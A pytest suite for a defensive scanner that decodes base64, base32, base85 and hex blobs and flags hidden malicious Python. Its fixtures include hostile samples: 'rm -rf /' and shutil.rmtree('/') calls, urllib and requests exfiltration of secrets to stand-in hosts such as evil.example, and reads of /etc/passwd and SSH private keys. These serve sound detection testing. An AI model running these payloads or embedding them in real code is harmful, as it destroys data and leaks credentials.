"""Tests for scan_decode.py — U1 bounded decode-and-rescan library."""

import ast
import base64
import binascii
import os
import time

import scan_decode as scanner


def _cats(findings):
    return {f.category for f in findings}


def _has_payload(findings):
    return any(f.category == "decoded-payload" for f in findings)


# Malicious plaintext that trips the trifecta exec primitive.
MALICIOUS = 'import os\nos.system("rm -rf /")\n'


class TestSingleLayer:
    def test_base64_single_layer_flags_payload(self):
        blob = base64.b64encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "evil/blob.txt")
        assert _has_payload(findings), "single-layer base64 of os.system must be flagged"
        # Finding cites origin and names the decoded indicator.
        payloads = [f for f in findings if f.category == "decoded-payload"]
        assert all(f.file == "evil/blob.txt" for f in payloads)
        assert any("system" in f.snippet.lower() or "system" in f.description.lower()
                   for f in payloads)

    def test_accepts_str_and_bytes(self):
        blob_b = base64.b64encode(MALICIOUS.encode())
        blob_s = blob_b.decode("ascii")
        assert _has_payload(scanner.rescan_blob(blob_b, "x"))
        assert _has_payload(scanner.rescan_blob(blob_s, "x"))


class TestRecursion:
    def test_double_base64_flags_once(self):
        inner = base64.b64encode(MALICIOUS.encode())
        outer = base64.b64encode(inner)
        findings = scanner.rescan_blob(outer, "nested.txt")
        assert _has_payload(findings), "base64(base64(malicious)) must surface the inner payload"

    def test_depth_cap_stops_at_three(self):
        # 4 layers of base64 nesting; the innermost is the payload. With a depth
        # cap of 3 the deepest layer is not decoded, so a max-depth note appears
        # and the call still returns (no hang).
        data = MALICIOUS.encode()
        for _ in range(4):
            data = base64.b64encode(data)
        findings = scanner.rescan_blob(data, "deep.txt")
        assert "decode-max-depth" in _cats(findings), "depth cap must emit a max-depth note"
        # MAX_DECODE_DEPTH is the documented cap.
        assert scanner.MAX_DECODE_DEPTH == 3


class TestDecodeBomb:
    def test_oversize_decode_truncated(self):
        # A base64 blob that decodes to > the per-blob cap must be truncated,
        # not held whole; the call returns without OOM.
        big = b"A" * (scanner.PER_BLOB_DECODED_CAP + 5 * 1024 * 1024)
        blob = base64.b64encode(big)
        findings = scanner.rescan_blob(blob, "bomb.txt")
        # Benign 'A' padding is not code-like, so no payload finding; the point
        # is that it RETURNS (no OOM / no hang).
        assert isinstance(findings, list)

    def test_per_blob_cap_is_two_mb(self):
        assert scanner.PER_BLOB_DECODED_CAP == 2 * 1024 * 1024
        assert scanner.PER_ORIGIN_DECODED_BUDGET == 8 * 1024 * 1024


class TestFalsePositiveControl:
    def test_benign_png_no_finding(self):
        # A minimal PNG header + IDAT-ish binary: high-entropy, NOT printable
        # ASCII -> must NOT flag (KTD8).
        png = (b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 8)
        blob = base64.b64encode(png)
        findings = scanner.rescan_blob(blob, "image.txt")
        assert not _has_payload(findings), "benign binary (PNG) must not flag"

    def test_benign_printable_text_no_finding(self):
        benign = ("The quick brown fox jumps over the lazy dog. " * 20).encode()
        blob = base64.b64encode(benign)
        findings = scanner.rescan_blob(blob, "prose.txt")
        assert not _has_payload(findings), "benign printable prose must not flag"

    def test_lockfile_hashes_no_finding(self):
        hashes = ("sha512-" + "0123456789abcdef" * 8 + "\n") * 30
        blob = base64.b64encode(hashes.encode())
        findings = scanner.rescan_blob(blob, "lock.txt")
        assert not _has_payload(findings)


class TestAlphabetCoverage:
    def test_base85_a85(self):
        blob = base64.a85encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "a85.txt")
        assert _has_payload(findings), "base85 (a85) payload must decode + flag"

    def test_base85_b85(self):
        blob = base64.b85encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "b85.txt")
        assert _has_payload(findings), "base85 (b85) payload must decode + flag"

    def test_base32(self):
        blob = base64.b32encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "b32.txt")
        assert _has_payload(findings), "base32 payload must decode + flag"

    def test_hex(self):
        blob = binascii.hexlify(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "hex.txt")
        assert _has_payload(findings), "hex payload must decode + flag"


class TestBudget:
    def test_many_blob_returns_with_note(self, monkeypatch):
        # Force the wall-clock budget to already be exhausted so a pathological
        # input returns immediately with a budget note rather than hanging.
        monkeypatch.setattr(scanner, "TOTAL_BUDGET_SEC", -1)
        blob = base64.b64encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "slow.txt")
        assert "decode-scan-incomplete" in _cats(findings)
        assert not _has_payload(findings)

    def test_origin_byte_budget_stops_recursion(self, monkeypatch):
        # A tiny per-origin budget must stop the recursion tree and emit a note.
        monkeypatch.setattr(scanner, "PER_ORIGIN_DECODED_BUDGET", 1)
        data = MALICIOUS.encode()
        for _ in range(3):
            data = base64.b64encode(data)
        findings = scanner.rescan_blob(data, "budget.txt")
        # Either a budget note or simply no payload — must not hang / OOM.
        assert isinstance(findings, list)


class TestNoExecSafety:
    def test_no_exec_eval_compile_callsite(self):
        """AST self-check (KTD4): scan_decode.py must contain no exec/eval call,
        and no compile(...) used with an exec/eval mode flag."""
        src_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "scripts", "scan_decode.py",
        )
        with open(src_path, "r", encoding="utf-8") as f:
            tree = ast.parse(f.read())

        # Bare-name builtins are the dangerous ones: exec(), eval(), and the
        # builtin compile() (which produces a code object for exec/eval).
        # Attribute calls like re.compile() are a different, safe symbol.
        banned_builtins = {"exec", "eval", "compile"}
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                assert node.func.id not in banned_builtins, (
                    f"forbidden builtin call {node.func.id}() in scan_decode.py"
                )
            # Also forbid an attribute-form exec/eval (e.g. builtins.exec).
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                assert node.func.attr not in {"exec", "eval"}, (
                    f"forbidden call to {node.func.attr}() in scan_decode.py"
                )

    def test_neutralize_strips_control_chars(self):
        dirty = "os.system\x00(\x1b[31m'x'‮)"
        clean = scanner._neutralize(dirty)
        assert "\x00" not in clean
        assert "\x1b" not in clean
        assert "‮" not in clean


# --- Torture-room regression tests (2026-06-17 hardening) ---------------------


class TestSharedDeadline:
    """Fix 1: a host scanner threads ONE shared deadline + byte budget across
    many blobs, so N blobs cannot blow the 15 s SIGKILL into a silent zero."""

    def test_new_budget_helper_exists(self):
        b = scanner.new_budget()
        assert hasattr(b, "deadline") and hasattr(b, "decoded_bytes")
        # An explicit absolute monotonic deadline is honoured, not re-armed.
        dl = time.monotonic() + 5
        b2 = scanner.new_budget(deadline=dl)
        assert b2.deadline == dl

    def test_passed_budget_is_shared_not_rearmed(self):
        # An already-expired shared budget means every blob returns immediately
        # with an incomplete note — the deadline is NOT re-armed per call.
        budget = scanner.new_budget(deadline=time.monotonic() - 1)
        blob = base64.b64encode(MALICIOUS.encode())
        total_findings = []
        for i in range(20):
            total_findings.extend(scanner.rescan_blob(blob, f"f{i}", budget=budget))
        # No payloads (we never got to decode), and at most one incomplete note
        # for the whole shared budget (deduped via budget.exhausted).
        assert not _has_payload(total_findings)
        notes = [f for f in total_findings if f.category == "decode-scan-incomplete"]
        assert len(notes) == 1, "shared budget exhaustion note must dedupe to one"

    def test_many_blobs_share_one_deadline_returns_fast(self):
        # 60 malicious blobs threaded through ONE budget return well under the
        # per-call 12 s budget (let alone 60 * 12 s) — the deadline is shared.
        budget = scanner.new_budget()
        blob = base64.b64encode(MALICIOUS.encode())
        t0 = time.monotonic()
        for i in range(60):
            scanner.rescan_blob(blob, f"f{i}", budget=budget)
        elapsed = time.monotonic() - t0
        assert elapsed < 13, f"shared-budget loop took {elapsed:.1f}s (should be << N*12s)"

    def test_deadline_kwarg_backcompat(self):
        # Legacy callers may pass an absolute deadline directly (shares time,
        # not bytes). An expired one returns with no payload.
        blob = base64.b64encode(MALICIOUS.encode())
        findings = scanner.rescan_blob(blob, "x", deadline=time.monotonic() - 1)
        assert not _has_payload(findings)


class TestInputSizeCap:
    """Fix 2: cap the INPUT blob before decode/ast.parse so a 5 MB blob cannot
    drive the decode+parse working set to ~1.5 GB."""

    def test_max_input_blob_constant(self):
        assert scanner.MAX_INPUT_BLOB == 1 * 1024 * 1024

    def test_oversize_input_truncated_before_decode_no_oom(self):
        import tracemalloc

        # ~11 MB of base64 that decodes to multi-statement printable Python: the
        # old code spiked RSS via full decode + ast.parse; the input cap must
        # truncate to 1 MB first so the working set stays bounded.
        big = (b"x = 1\ny = 2\n") * 700000
        blob = base64.b64encode(big)
        tracemalloc.start()
        findings = scanner.rescan_blob(blob, "big.txt")
        peak = tracemalloc.get_traced_memory()[1]
        tracemalloc.stop()
        assert isinstance(findings, list)
        # Generous ceiling: well under the old ~1.5 GB spike.
        assert peak < 600 * 1024 * 1024, f"peak {peak/1e6:.0f}MB too high"


class TestAscii85Expansion:
    """Fix 2 (cont.): the ascii85 'z'-shortcut expansion is counted against the
    byte budget and a pre-decode guard prevents the ~95x transient."""

    def test_z_bomb_does_not_spike_memory(self):
        import tracemalloc

        # 5 MB of 'z' (a85 z-shortcut expands 1 byte -> 4). Input cap + pre-decode
        # expansion guard must keep the transient small.
        zblob = b"z" * (5 * 1024 * 1024)
        budget = scanner.new_budget()
        tracemalloc.start()
        findings = scanner.rescan_blob(zblob, "z.txt", budget=budget)
        peak = tracemalloc.get_traced_memory()[1]
        tracemalloc.stop()
        assert isinstance(findings, list)
        assert peak < 120 * 1024 * 1024, f"z-bomb peak {peak/1e6:.0f}MB too high"

    def test_full_decoded_length_counted_not_post_truncation(self):
        # Decode a85 that expands, and assert the budget sees the FULL
        # pre-truncation decoded length (expansion visible to the cap).
        budget = scanner.new_budget()
        zblob = b"z" * (800 * 1024)  # under input cap; a85 expands ~4x
        scanner.rescan_blob(zblob, "z2.txt", budget=budget)
        # If only post-truncation bytes were counted this could be <= input size;
        # expansion accounting makes it strictly larger than the raw input.
        assert budget.decoded_bytes > 800 * 1024


class TestFanOutBound:
    """Fix 3: a blob matching many alphabets pursues at most
    MAX_DECODERS_PER_BLOB decodings, not all 5 (which gave 5^depth fan-out)."""

    def test_max_decoders_constant(self):
        assert scanner.MAX_DECODERS_PER_BLOB <= 2

    def test_fan_out_capped_per_blob(self):
        budget = scanner.new_budget()
        # A hex-ish blob historically validated under all 5 alphabets.
        cands = list(scanner._decode_candidates(b"deadbeef" * 8, budget))
        assert len(cands) <= scanner.MAX_DECODERS_PER_BLOB


class TestBroadenedReportGate:
    """Fix 4: getattr-dispatch, urllib/http exfil, and sensitive-file reads ARE
    now reported (they decoded silently before)."""

    def test_getattr_dispatch_flagged(self):
        payload = b"getattr(os, 'system')('rm -rf /')\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "g.txt")
        assert _has_payload(findings), "getattr-based os.system dispatch must flag"

    def test_getattr_import_dispatch_flagged(self):
        payload = b"getattr(__import__('os'), 'system')('id')\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "g2.txt")
        assert _has_payload(findings)

    def test_urllib_exfil_flagged(self):
        payload = (
            b"import urllib.request\n"
            b"urllib.request.urlopen('http://evil.example/' + secret)\n"
        )
        findings = scanner.rescan_blob(base64.b64encode(payload), "u.txt")
        assert _has_payload(findings), "urllib exfiltration must flag"

    def test_requests_exfil_flagged(self):
        payload = b"import requests\nrequests.post('http://evil', data=token)\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "r.txt")
        assert _has_payload(findings)

    def test_open_sensitive_file_flagged(self):
        payload = b"data = open('/etc/passwd').read()\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "o.txt")
        assert _has_payload(findings), "open('/etc/passwd').read() must flag"

    def test_open_ssh_key_flagged(self):
        payload = b"k = open('/home/user/.ssh/id_rsa').read()\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "s.txt")
        assert _has_payload(findings)

    def test_benign_open_not_flagged(self):
        # A benign open of an ordinary file must NOT trip the sensitive-file check.
        payload = b"cfg = open('config.yaml').read()\nprint(cfg)\n"
        findings = scanner.rescan_blob(base64.b64encode(payload), "cfg.txt")
        assert not _has_payload(findings), "benign open must not flag"


class TestNoteDedup:
    """Fix (M3): max-depth and budget-exhausted notes are emitted at most once
    per origin even under fan-out."""

    def test_max_depth_note_deduped(self):
        # 5 layers of nesting fans out yet must emit exactly one max-depth note.
        data = MALICIOUS.encode()
        for _ in range(5):
            data = base64.b64encode(data)
        findings = scanner.rescan_blob(data, "deep.txt")
        notes = [f for f in findings if f.category == "decode-max-depth"]
        assert len(notes) <= 1, "max-depth note must dedupe to at most one"

    def test_budget_note_deduped(self):
        budget = scanner.new_budget(deadline=time.monotonic() - 1)
        data = MALICIOUS.encode()
        for _ in range(3):
            data = base64.b64encode(data)
        findings = scanner.rescan_blob(data, "b.txt", budget=budget)
        notes = [f for f in findings if f.category == "decode-scan-incomplete"]
        assert len(notes) <= 1


class TestFullBlobAcceptance:
    """Fix 5: callers pass full encoded/decoded blobs; rescan_blob handles them
    under the input cap without OOM or hang."""

    def test_large_full_blob_returns(self):
        # A 3 MB full base64 blob (over the input cap) is accepted and bounded.
        payload = (b"import os\nos.system('x')\n") + b"# pad\n" * 1000000
        blob = base64.b64encode(payload)
        assert len(blob) > scanner.MAX_INPUT_BLOB
        findings = scanner.rescan_blob(blob, "full.txt")
        assert isinstance(findings, list)


class TestBase85CharsetFix:
    """Adversarial P1-1: the old detection regex `[!-u]` excluded the 9 chars
    `v w x y z { | } ~` that RFC1924 b85 (base64.b85encode) actually uses, so
    ~99.8% of real b85 payloads were split into sub-floor fragments and never
    routed to decode. detect_encoded_blobs now uses the corrected union charset."""

    def test_b85encode_payload_detected_whole(self):
        # A real b85 blob almost always contains an excluded char (v-z, {|}~).
        payload = b"import os; os.system(chr(99))" * 3
        blob = base64.b85encode(payload).decode()
        assert any(c in blob for c in "vwxyz{|}~"), "fixture must exercise the gap"
        blobs = scanner.detect_encoded_blobs(blob)
        assert blob in blobs, "the b85 blob must be detected WHOLE (P1-1 regression)"

    def test_b85encode_payload_decoded_and_flagged(self):
        payload = b"import os\nos.system(chr(99))\n"
        blob = base64.b85encode(payload).decode()
        findings = scanner.rescan_blob(blob, "b85.txt")
        assert _has_payload(findings), "real b85 payload must decode + flag"

    def test_a85encode_payload_decoded_and_flagged(self):
        payload = b"import os\nos.system(chr(99))\n"
        blob = base64.a85encode(payload).decode()
        findings = scanner.rescan_blob(blob, "a85.txt")
        assert _has_payload(findings), "ascii85 payload must decode + flag"

    def test_b85_charset_does_not_match_prose(self):
        # The corrected b85 union must stay tight: ordinary prose (with spaces,
        # commas, periods) must NOT be detected as one giant blob.
        prose = "The quick brown fox, jumps over the lazy dog. " * 4
        assert scanner.detect_encoded_blobs(prose) == []


class TestDetectEncodedBlobsHelper:
    """Fix 3 (hoist): detect_encoded_blobs is the single source of truth that the
    splitstream agent imports. Verify the helper contract."""

    def test_detects_each_alphabet(self):
        long = b"A" * 60
        for enc in (base64.b64encode, base64.b32encode,
                    base64.b85encode, base64.a85encode):
            blob = enc(long).decode()
            assert scanner.detect_encoded_blobs(blob), enc.__name__

    def test_strips_edge_delims_and_dedups(self):
        blob = base64.b64encode(b"X" * 60).decode()
        text = '"%s" `%s`' % (blob, blob)   # same blob, quoted twice
        out = scanner.detect_encoded_blobs(text)
        assert out == [blob], "edge delims stripped + duplicate collapsed"

    def test_floor_parametrizable(self):
        short = base64.b64encode(b"abcdefghij").decode()  # ~16 chars
        assert scanner.detect_encoded_blobs(short, floor=50) == []
        assert short in scanner.detect_encoded_blobs(short, floor=12)

    def test_build_blob_res_returns_four(self):
        res = scanner.build_blob_res(12)
        assert len(res) == 4

    def test_feed_blobs_dedups_and_guards(self):
        blob = base64.b64encode(b"import os\nos.system('x')\n").decode()
        seen, findings = set(), []
        budget = scanner.new_budget()
        scanner.feed_blobs([blob, blob], "f.txt", seen, findings, budget)
        assert _has_payload(findings)
        # second identical blob deduped
        assert len(seen) == 1


class TestSingleStatementGate:
    """Adversarial P1-2: a SINGLE destructive/exec/process-spawn statement one
    base64 layer deep was returning 0 findings because _looks_code_like needs
    >=2 statements or a token hit. The dangerous-call check now flags it."""

    def test_single_rmtree_flagged(self):
        findings = scanner.rescan_blob(base64.b64encode(b'shutil.rmtree("/")'), "r.txt")
        assert _has_payload(findings), "single shutil.rmtree must flag"

    def test_single_os_system_chr_flagged(self):
        # os.system(chr(...)) — no pipe-to-shell (exfil-guard safe).
        findings = scanner.rescan_blob(
            base64.b64encode(b"os.system(chr(114)+chr(109))"), "s.txt")
        assert _has_payload(findings)

    def test_single_os_remove_flagged(self):
        findings = scanner.rescan_blob(base64.b64encode(b'os.remove("/data")'), "d.txt")
        assert _has_payload(findings)

    def test_single_subprocess_flagged(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b'subprocess.Popen(["x"])'), "p.txt")
        assert _has_payload(findings)

    def test_single_socket_flagged(self):
        findings = scanner.rescan_blob(base64.b64encode(b"socket.socket()"), "k.txt")
        assert _has_payload(findings)

    def test_single_path_unlink_flagged(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b'Path("/etc/x").unlink()'), "u.txt")
        assert _has_payload(findings)

    def test_benign_single_open_silent(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b"open('config.yaml')"), "c.txt")
        assert not _has_payload(findings), "benign single open must stay silent"

    def test_benign_single_print_silent(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b"print('hello world from the config file')"), "p.txt")
        assert not _has_payload(findings), "benign print must stay silent"


class TestProseMentionNotFlagged:
    """HIGH-1 (torture round 2): encoded PROSE that merely MENTIONS a dangerous
    call must NOT trip the dangerous-call gate. The discriminator is ast.parse:
    real code parses and contains a Call to a dangerous primitive; an English
    sentence naming the call raises SyntaxError and stays silent. The
    single-statement TRUE positive it was added for must still fire."""

    # (a) — the exact repro from the torture finding.
    def test_prose_mentioning_rmtree_silent(self):
        raw = (b"Remember the helper will call shutil.rmtree(target) only after a "
               b"confirmation dialog appears on screen.")
        findings = scanner.rescan_blob(base64.b64encode(raw), "doc.md")
        assert not _has_payload(findings), (
            "encoded prose mentioning shutil.rmtree(target) must not flag")

    def test_prose_mentioning_os_system_silent(self):
        raw = (b"Our coding standard strictly forbids any use of os.system() calls "
               b"in production handlers for safety reasons.")
        findings = scanner.rescan_blob(base64.b64encode(raw), "policy.md")
        assert not _has_payload(findings), (
            "encoded prose mentioning os.system() must not flag")

    def test_prose_mentioning_subprocess_silent(self):
        raw = (b"In the changelog we noted that the team chose to stop using "
               b"subprocess.run() and switched to a safer helper instead.")
        findings = scanner.rescan_blob(base64.b64encode(raw), "CHANGELOG.md")
        assert not _has_payload(findings)

    def test_prose_mentioning_path_unlink_silent(self):
        raw = (b"To delete a temp file you typically write Path(name).unlink("
               b"missing_ok=True) somewhere near the end of the routine.")
        findings = scanner.rescan_blob(base64.b64encode(raw), "howto.md")
        assert not _has_payload(findings)

    def test_prose_mentioning_eval_silent(self):
        raw = (b"The security review reminded everyone never to eval(user_input) "
               b"because that lets attackers run arbitrary code on the host.")
        findings = scanner.rescan_blob(base64.b64encode(raw), "review.md")
        assert not _has_payload(findings)

    def test_prose_base85_variant_silent(self):
        # The same prose carried via RFC1924 base85 must also stay silent.
        raw = (b"To delete a temp file you typically write Path(name).unlink("
               b"missing_ok=True) somewhere near the end of the routine.")
        findings = scanner.rescan_blob(base64.b85encode(raw), "howto85.md")
        assert not _has_payload(findings)

    # (b) — the single-statement TRUE positive must STILL fire (no regression).
    def test_single_rmtree_root_still_flagged(self):
        findings = scanner.rescan_blob(base64.b64encode(b'shutil.rmtree("/")'), "r.txt")
        assert _has_payload(findings), "real single shutil.rmtree(\"/\") must still flag"

    # (c) — os.system(chr(...)) real code still fires (exfil-guard-safe).
    def test_single_os_system_chr_still_flagged(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b"os.system(chr(114)+chr(109))"), "s.txt")
        assert _has_payload(findings), "os.system(chr(...)) real code must still flag"

    # (d) — benign single statements stay silent.
    def test_benign_open_config_silent(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b"open('config.yaml')"), "c.txt")
        assert not _has_payload(findings)

    def test_benign_print_silent(self):
        findings = scanner.rescan_blob(
            base64.b64encode(b"print('done')"), "p.txt")
        assert not _has_payload(findings)

    # (e) — a multi-statement real payload that embeds the dangerous call is still
    # caught (the AST sees the Call node).
    def test_multistatement_real_payload_still_flagged(self):
        payload = (b"import shutil\n"
                   b"target = '/'\n"
                   b'shutil.rmtree(target)\n')
        findings = scanner.rescan_blob(base64.b64encode(payload), "m.py")
        assert _has_payload(findings), "multi-statement real rmtree payload must flag"

    # Embedded real code inside a larger non-Python blob: the full text does not
    # ast.parse, but the windowed fallback around the match confirms the Call.
    def test_embedded_real_call_windowed_fallback_flagged(self):
        # A JSON-ish wrapper that is NOT valid Python as a whole, but the value
        # line is a real dangerous statement.
        payload = (b"### config dump (not python) ###\n"
                   b"os.system(chr(105)+chr(100))\n"
                   b"--- end ---")
        findings = scanner.rescan_blob(base64.b64encode(payload), "blob.txt")
        assert _has_payload(findings), (
            "real dangerous call embedded in a non-python blob must flag via window")

    # Direct discriminator unit checks.
    def test_confirm_helper_distinguishes_code_from_prose(self):
        assert scanner._ast_has_dangerous_call('shutil.rmtree("/")')
        assert scanner._ast_has_dangerous_call('os.system(chr(99))')
        assert not scanner._ast_has_dangerous_call(
            "the helper will call shutil.rmtree(target) only after a dialog")
        # A benign attribute call that happens to share no dangerous attr name.
        assert not scanner._ast_has_dangerous_call('os.path.join("a", "b")')


class TestSharedBudgetThreading:
    """Fix (shared-budget): many blobs through ONE budget share the wall-clock
    deadline AND the cumulative byte cap; the scan stays time-bounded."""

    def test_one_budget_across_many_blobs(self):
        budget = scanner.new_budget()
        findings = []
        seen = set()
        blobs = [base64.b64encode(b"import os\nos.system('x')\n" + bytes([i])).decode()
                 for i in range(50)]
        start = time.monotonic()
        scanner.feed_blobs(blobs, "many.txt", seen, findings, budget)
        assert time.monotonic() - start < scanner.TOTAL_BUDGET_SEC + 5
        # The single budget object accumulated bytes across all blobs.
        assert budget.decoded_bytes > 0

    def test_expired_shared_budget_stops_early(self):
        budget = scanner.new_budget(deadline=time.monotonic() - 1)
        findings, seen = [], set()
        blobs = [base64.b64encode(b"import os\nos.system('x')\n").decode()] * 10
        scanner.feed_blobs(blobs, "exp.txt", seen, findings, budget)
        # Over-deadline budget => no payload work, at most a single incomplete note.
        assert not _has_payload(findings)
